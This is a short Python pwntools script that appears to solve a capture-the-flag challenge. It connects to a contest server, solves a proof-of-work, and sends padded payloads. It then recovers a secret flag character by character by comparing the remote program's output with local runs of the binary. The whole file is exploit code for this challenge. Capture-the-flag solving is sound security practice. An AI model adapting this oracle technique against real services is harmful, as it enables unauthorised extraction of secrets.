from pwn import *
import subprocess
import string


# known = []
known = [b'R', b'}'] # we know that last character is }, R was discovered during tests
base = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'

for i in range(len(known), 16):
    if args.REMOTE:
        p = remote('kctf.rozdzka.securing.pl', 30001)
        data = p.recvuntil("pow) solve ")
        data = p.recvline().decode().strip()
        print(' '.join(['python', 'pow.py', 'solve', data]))
        res = subprocess.check_output(['python3', 'pow.py', 'solve', data])
        p.sendline(res)
        p.clean()
    else:
        p = process('./chal_orig')

    payload = base + b'B' * (15-i)
    print(payload + b'\x00' + b''.join(known))
    p.sendline(payload)
    p.recvuntil("My first number is ")
    line = p.recvline().decode().strip()
    print(line)
    line = line.split('.')[0]
    first_number = int(line)
    p.close()

    fnd = False
    # for c in '}{' + string.ascii_uppercase:
    for c in string.ascii_letters + string.digits + '{}_-':
        payload = base + b'B' * (15-i)
        payload += b'\x00'
        payload += c.encode()
        payload += b''.join(known)

        with open("./chal_arg", "wb") as f:
            f.write(payload)

        ps = subprocess.Popen(('cat', './chal_arg'), stdout=subprocess.PIPE)
        output = subprocess.check_output(('./chal', ), stdin=ps.stdout)
        ps.wait()
        output = output.split(b'||')
        # print(output[0])
        numbers = output[1].decode().strip().split(' ')
        numbers = list(map(int, numbers))
        # print(len(numbers))
        # print(first_number, numbers[0])

        if first_number == numbers[0]:
            if not fnd:
                known.insert(0, c.encode())
            fnd = True
            print('ok', c)
            # break

    if not fnd:
        print("Not found!")
        break

    print()

print(b''.join(known).decode())
